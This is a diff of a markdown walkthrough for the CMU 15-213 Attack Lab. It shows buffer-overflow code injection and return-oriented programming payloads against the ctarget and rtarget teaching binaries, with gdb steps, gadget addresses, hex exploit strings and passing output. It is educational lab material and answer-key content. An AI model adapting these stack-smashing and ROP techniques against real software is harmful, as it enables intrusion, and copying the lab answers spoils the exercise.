@@ -58,12 +58,16 @@ phase1.txt
 
 now we need to take this file and run it through the program hex2raw which will generate raw exploit strings, and then run the raw file. this can be done through command below
 
+```
 linux> ./hex2raw < phase1.txt > 2018080106.ctarget.l1
 linux> ./ctarget -q -i 2018080106.ctarget.l1
+```
 
 or you can run it in one line
 
+```
 linux> ./hex2raw < phase1.txt > 2018080106.ctarget.l1; ./ctarget -q -i 2018080106.ctarget.l1
+```
 
 if its correct, you should get somethings similar to below
 ```
@@ -115,20 +119,21 @@ we have to modify the %rdi register to store our cookie in there. thus, we need 
 create a file called phase2.s and write the code below,
 
 phase2.s 
+
 ```
 movq $0x117fd061, %rdi
 retq
 ```
 
 we need byte representation of code we wrote above, compile it with gcc then dissasemble it, use these commands
-
+```
 linux> gcc -c phase2.s
 linux> objdump -d phase2.o > phase2.d
-
+```
 or in one line
-
+```
 linux> gcc -c phase2.s; objdump -d phase2.o > phase2.d 
-
+```
 
 if we open the file phase2.d we should get something like below
 
@@ -148,14 +153,17 @@ Disassembly of section .text:
 the byte representation of the assembly code is 48 c7 c7 61 d0 7f 11 c3, 
 now we need to find the address of rsp register using commands
 
+```
 gdb> gdb ctarget
 gdb> b getbuf
 gdb> r -q
 gdb> n
 gdb> p $rsp
+```
 
 looks something like this... 
 
+```
 (gdb) b getbuf
 Breakpoint 1 at 0x40194d: file buf.c, line 12.
 (gdb) r -q
@@ -168,6 +176,7 @@ Breakpoint 1, getbuf () at buf.c:12
 14      in buf.c
 (gdb) p $rsp
 $1 = (void *) 0x55612538
+```
 
 0x55612538 is the address we want, now create a text file named phase2.txt, remember that the bytes for rsp and touch2 go in reverse. 
 
@@ -190,14 +199,15 @@ second to last line is address of register %rsp
 last line is address of touch2 function
 
 now we run it through hex2raw, using the following commands
-
+```
 linux> quit
 linux> y
 linux> ./hex2raw < phase2.txt > 2018080106.ctarget.l2
 linux> ./ctarget -q -i 2018080106.ctargetl2
-
+```
 you shoud get the following result
 
+```
 Cookie: 0x117fd061
 Touch2!: You called touch2(0x117fd061)
 Valid solution for level 2 with target ctarget
@@ -206,6 +216,7 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  2018080106:PASS:0xffffffff:ctarget:2:48 C7 C7 61 D0 7F 11 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 25 61 55 00 00 00 00 8F 19 40 00 00 00 00 00
+```
 
 ## Phase 3
 Kinda similar to Phase 2, also involves a code injection attack, but passing a string as an argument. The passed paramter $rdi should be changed from a number to a pointer, and the character representation of the cookie should be input. Note that the function hexmatch and strncmp may fill the stack with other data, overwriting it, so we have to be careful where we store it.
@@ -272,8 +283,11 @@ a0 1a 40 00 00 00 00 00 //touch3 address
 ```
 
 Input commands
+
+```
 linux> ./hex2raw < phase3.txt > 2018080106.rtarget.l1
 linux> ./ctarget -q -i 2018080106.rtarget.l1
+```
 
 and you should get something similar to below 
 ```
@@ -291,11 +305,12 @@ phase 4 is different from previous 3 because on this stack target we can't execu
 
 First execute the following commands to get assembly code for rtarget
 
-linux> objdump -d rtarget > rtarget.d
+```linux> objdump -d rtarget > rtarget.d```
 
 shown below
 rtarget.d
----
+
+```
 000000000040194d <getbuf>:
   40194d:	48 83 ec 38          	sub    $0x38,%rsp
   401951:	48 89 e7             	mov    %rsp,%rdi
@@ -303,37 +318,36 @@ rtarget.d
   401959:	b8 01 00 00 00       	mov    $0x1,%eax
   40195e:	48 83 c4 38          	add    $0x38,%rsp
   401962:	c3                   	retq 
----
+```
 
 BUFFER_SIZE=0x38
   
 The general idea is to store the cookie in a certain position in the stack, and then if you can directly pop %rdi, you can directly enter the touch2 function. But there is no pop %rdi in gadget, so we need to find another way. After checking, I found that there are two sentences 
-
+```
 pop %rax 
 movq %rax, %rdi
-
+```
 which can be put together to exploit the rtarget program, we can find this in the dissassembled code, there are a lot of functions and the ones we can pic are located between_start farm and end__farm. our two are 
 
 rtarget.d
----
+```
 0000000000401b64 <getval_407>:
   401b64:	b8 c2 48 89 c7       	mov    $0xc78948c2,%eax
   401b69:	c3  
----
+```
 
 and 
 rtarget.d
----
+```
 0000000000401b43 <setval_227>:
   401b43:	c7 07 48 58 90 c3    	movl   $0xc3905848,(%rdi)
   401b49:	c3                   	retq   
----
-
+```
 which give us our two address for popq %rax, movq %rax, %rdi. However, notice that since movq starts on the third byte, we have to add 2 to the address. Do the same for popq. New addresses are shown below
-
+```
 movq - 401b64 + 2 = 401b66 
 popq - 401b43 + 3 = 401b46
-
+```
 
 create phase4.txt which contains string
 padding
@@ -345,7 +359,7 @@ touch 2 address (shown below)
 
 
 phase4.txt
----
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -357,11 +371,12 @@ phase4.txt
 61 d0 7f 11 00 00 00 00 // cookie
 66 1b 40 00 00 00 00 00 // address 2
 8f 19 40 00 00 00 00 00 // touch2 location 
---- 
+```
 
 
 After running the following commands, we get something like this
 
+```
 Cookie: 0x117fd061
 Touch2!: You called touch2(0x117fd061)
 Valid solution for level 2 with target rtarget
@@ -370,13 +385,14 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  2018080106:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 46 1B 40 00 00 00 00 00 61 D0 7F 11 00 00 00 00 66 1B 40 00 00 00 00 00 8F 19 40 00 00 00 00 00
-
+```
 
 ## PHASE 5
 
 create a phase5.txt with the string below.
 phase5.txt
----
+
+```
 00 00 00 00 00 00 00 00 // buffer
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -395,16 +411,17 @@ ac 1b 40 00 00 00 00 00
 3e 1b 40 00 00 00 00 00
 a0 1a 40 00 00 00 00 00	// touch3
 31 31 37 66 64 30 36 31 // cookie
----
+```
 
 use the commands below to run it
-
+```
 linux> ./hex2raw < phase5.txt > 2018080106.rtarget.l2
 linux ./rtarget -q -i 2018080106.rtarget.l2 
+```
 
+which should give you output similar to
 
-which should give you output similar to 
----
+```
 Cookie: 0x117fd061
 Touch3!: You called touch3("117fd061")
 Valid solution for level 3 with target rtarget
@@ -413,6 +430,5 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  2018080106:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 4C 1C 40 00 00 00 00 00 3E 1B 40 00 00 00 00 00 46 1B 40 00 00 00 00 00 48 00 00 00 00 00 00 00 FC 1B 40 00 00 00 00 00 A7 1B 40 00 00 00 00 00 AC 1B 40 00 00 00 00 00 76 1B 40 00 00 00 00 00 3E 1B 40 00 00 00 00 00 A0 1A 40 00 00 00 00 00 31 31 37 66 64 30 36 31
---- 
-
+```
 
